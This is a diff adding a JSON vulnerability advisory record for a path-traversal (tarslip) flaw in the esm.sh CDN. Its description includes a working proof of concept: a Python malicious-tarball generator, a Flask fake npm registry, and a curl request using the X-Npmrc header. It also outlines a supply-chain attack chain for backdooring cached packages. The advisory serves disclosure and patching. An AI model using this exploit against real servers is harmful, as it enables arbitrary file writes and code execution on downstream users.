@@ -1,0 +1,56 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2025-11-19T20:30:01Z",
+  "Package": {
+    "Ecosystem": "GO",
+    "Name": "github.com/esm-dev/esm.sh"
+  },
+  "Advisory": {
+    "DatabaseId": 322313,
+    "Id": "GSA_kwCzR0hTQS1oM213LTRmMjMtZ3dwd84ABOsJ",
+    "GhsaId": "GHSA-h3mw-4f23-gwpw",
+    "References": [
+      {
+        "Url": "https://github.com/esm-dev/esm.sh/security/advisories/GHSA-h3mw-4f23-gwpw"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-65025"
+      },
+      {
+        "Url": "https://github.com/esm-dev/esm.sh/commit/9d77b88c320733ff6689d938d85d246a3af9af16"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-h3mw-4f23-gwpw"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-h3mw-4f23-gwpw"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2025-65025"
+      }
+    ],
+    "Description": "### Summary\nThe esm.sh CDN service is vulnerable to a Path Traversal (CWE-22) vulnerability during NPM package tarball extraction.  \nAn attacker can craft a malicious NPM package containing specially crafted file paths (e.g., `package/../../tmp/evil.js`).  \nWhen esm.sh downloads and extracts this package, files may be written to arbitrary locations on the server, escaping the intended extraction directory.\n\nUploading files containing `../` in the path is not allowed on official registries (npm, GitHub), but the `X-Npmrc` header allows specifying any arbitrary registry.  \nBy setting the registry to an attacker-controlled server via the `X-Npmrc` header, this vulnerability can be triggered.\n\n### Details\n**file:** `server/npmrc.go`  \n**line:** 552-567\n\n```go\nfunc extractPackageTarball(installDir string, pkgName string, tarball io.Reader) (err error) {\n    \n    pkgDir := path.Join(installDir, \"node_modules\", pkgName)\n    \n    tr := tar.NewReader(unziped)\n    for {\n        h, err := tr.Next()\n        // ...\n        \n        // Strip tarball root directory\n        _, name := utils.SplitByFirstByte(h.Name, '/')  // \"package/../../tmp/evil\" → \"../../tmp/evil\"\n        filename := path.Join(pkgDir, name)             // ← No validation\n        \n        if h.Typeflag != tar.TypeReg {\n            continue \n        }\n        \n        // Extension filtering\n        extname := path.Ext(filename)\n        if !(extname != \"\" \u0026\u0026 (allowed_extensions)) {\n            continue  // Only extract .js, .css, .json, etc.\n        }\n        \n        ensureDir(path.Dir(filename))\n        f, err := os.OpenFile(filename, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)\n        // ← File created without path validation!\n        // ...\n    }\n}\n```\nThe code uses `path.Join(pkgDir, name)`, which normalizes the path and allows sequences like `../../` to escape the intended package directory.\n\n```\npkgDir: /esm/npm/evil-pkg@1.0.0/node_modules/evil-pkg\nname:   ../../../../../../tmp/pyozzi.js\nresult:   /esm/npm/evil-pkg@1.0.0/node_modules/evil-pkg/../../../../../../tmp/pyozzi.js\n        → /tmp/pyozzi.js  (path traversal)\n```\n\n### PoC\n### Test On\n- esm.sh Official Docker Image (latest version)\n- python 3.11\n- flask (for attacker registry server)\n\n### Step 1. Create Malicious tarball file\n```python\n#!/usr/bin/env python3\n\"\"\"\nMalicious Tarball Generator for esm.sh Path Traversal\nCreates tarball with path traversal payloads\n\"\"\"\n\nimport tarfile\nimport io,os\nimport json\nfrom datetime import datetime\n\ndef create_malicious_tarball(package_name=\"test-tarslip\"):\n    \n    # PoC file Content\n    poc_payload = b\"\"\"// Path Traversal PoC\n    // This file was created via tarslip attack\n    // Location: /tmp/pyozzi.js\n\n    console.log('[!!!] Path Traversal Successful!');\n    console.log('Package: %s');\n    console.log('Researcher: pyozzi');\n\n    module.exports = {\n        poc: true,\n        vulnerability: 'CWE-22 Path Traversal',\n        package: '%s'\n    };\n    \"\"\" % (package_name.encode(), package_name.encode())\n    \n    files = {\n        \"package/index.js\": b\"module.exports = { version: '1.0.0', test: true };\",\n        \"package/package.json\": json.dumps({\n            \"name\": package_name,\n            \"version\": \"1.0.0\",\n            \"description\": \"Test package for security research\",\n            \"main\": \"index.js\",\n            \"keywords\": [\"test\", \"security\", \"research\"],\n            \"author\": \"Security Researcher\",\n            \"license\": \"MIT\"\n        }, indent=2).encode(),\n        \n        \"package/../../../../../../../../../tmp/pyozzi.js\": poc_payload,\n    }\n    \n    # Create Tarball\n    \n    tarball_name = f\"{package_name}-1.0.0.tgz\"\n    \n    print(\"Creating tarball with payloads:\")\n    print()\n    \n    with tarfile.open(tarball_name, \"w:gz\") as tar:\n        for name, content in files.items():\n            info = tarfile.TarInfo(name=name)\n            info.size = len(content)\n            info.mode = 0o755\n            info.mtime = int(datetime.now().timestamp())\n            tar.addfile(info, io.BytesIO(content))\n\n    print(f\"File: {tarball_name}\")\n    print(f\"Size: {os.path.getsize(tarball_name)} bytes\")\n\n    # Check Tarball Content\n    print(\"Tarball contents:\")\n    with tarfile.open(tarball_name, \"r:gz\") as tar:\n        for member in tar.getmembers():\n            marker = \"\u003e\u003e \" if \"../\" in member.name else \"   \"\n            mode = oct(member.mode)[-3:]\n            print(f\"{marker}{member.name} (mode: {mode})\")\n\nif __name__ == '__main__':\n    create_malicious_tarball()\n```\n\n**output:**\n```bash\n $ python create_tarball.py\nCreating tarball with payloads:\n\nFile: test-tarslip-1.0.0.tgz\nSize: 545 bytes\nTarball contents:\n   package/index.js (mode: 755)\n   package/package.json (mode: 755)\n\u003e\u003e package/../../../../../../../../../tmp/pyozzi.js (mode: 755)\n```\n\n### Step 2. Run Fake Registry Server\n```python\n# fake-npm-registry.py\nfrom flask import Flask, jsonify, send_file\n\napp = Flask(__name__)\n\nMALICIOUS_TARBALL = \"/tmp/test-tarslip-1.0.0.tgz\" # HERE MALICIOUS TAR PATH\nREGISTRY_URL = \"http://host.docker.internal:9999\" # HERE FAKE REGISTRY SERVER\n\n@app.route('/\u003cpackage\u003e')\ndef get_metadata(package):\n    return jsonify({\n        \"name\": package,\n        \"versions\": {\n            \"1.0.0\": {\n                \"name\": package,\n                \"version\": \"1.0.0\",\n                \"dist\": {\n                    \"tarball\": f\"{REGISTRY_URL}/{package}/-/{package}-1.0.0.tgz\"\n                }\n            }\n        },\n        \"dist-tags\": {\"latest\": \"1.0.0\"}\n    })\n\n@app.route('/\u003cpackage\u003e/-/\u003cfilename\u003e')\ndef get_tarball(package, filename):\n    return send_file(MALICIOUS_TARBALL, mimetype='application/gzip')\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=9999)\n```\n\n```bash\npython3 fake-npm-registry.py\n```\n\n### Step 3. Request Malicious Package with X-Npmrc Header\n```bash\ncurl \"http://localhost:8080/test-tarslip@1.0.0\" \\\n  -H 'X-Npmrc: {\"registry\":\"http://host.docker.internal:9999/\"}'\n```\n\n### Step 4. Check Path Traversal\n```bash\ndocker exec esm-test cat /tmp/pyozzi.js\n\n# ouput:\n// Path Traversal PoC\n    // This file was created via tarslip attack\n    // Location: /tmp/pyozzi.js\n\n    console.log('[!!!] Path Traversal Successful!');\n    console.log('Package: test-tarslip');\n    console.log('Researcher: pyozzi');\n\n    module.exports = {\n        poc: true,\n        vulnerability: 'CWE-22 Path Traversal',\n        package: 'test-tarslip'\n    };\n...\n```\n\n### Impact\nThis vulnerability enables large-scale remote code execution on end-user endpoints through supply chain attacks. The path traversal vulnerability allows attackers to overwrite package resources stored in esm.sh's cache. Package lists and file paths can be discovered through esm.sh's REST API endpoints. By overwriting these resource files with malicious code, arbitrary code execution occurs on all endpoints that subsequently import the compromised packages.\n\n**Attack Chain:**\n1. Attacker identifies popular packages and their cached build file locations via API enumeration\n2. Uses path traversal to overwrite cached build files (e.g., `/esm/storage/modules/react@18.3.1/es2022/react.mjs`)\n3. Injects malicious code into the build files\n4. Any application importing these packages receives the backdoored version\n5. Malicious code executes on victim endpoints (browsers, Electron apps, Deno applications)\n\n**Impact Scale:**\n- Affects all downstream users of compromised packages\n- Can target specific frameworks (React, Vue, etc.) used by thousands of applications\n- Enables XSS in browsers, RCE in Electron applications\n- Difficult to detect as traffic appears legitimate\n\n### Patch\n1. Path validation is required when unpacking a tar file.\n2. `X-Npmrc` whitelist logic is required.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2025-11-19T20:30:00Z",
+    "Severity": "HIGH",
+    "Summary": "esm.sh CDN service has arbitrary file write via tarslip",
+    "UpdatedAt": "2025-11-19T20:30:01Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 8.2,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.0.0-20251117232647-9d77b88c3207"
+      },
+      "VulnerableVersionRange": "\u003c 0.0.0-20251117232647-9d77b88c3207"
+    }
+  ]
+}
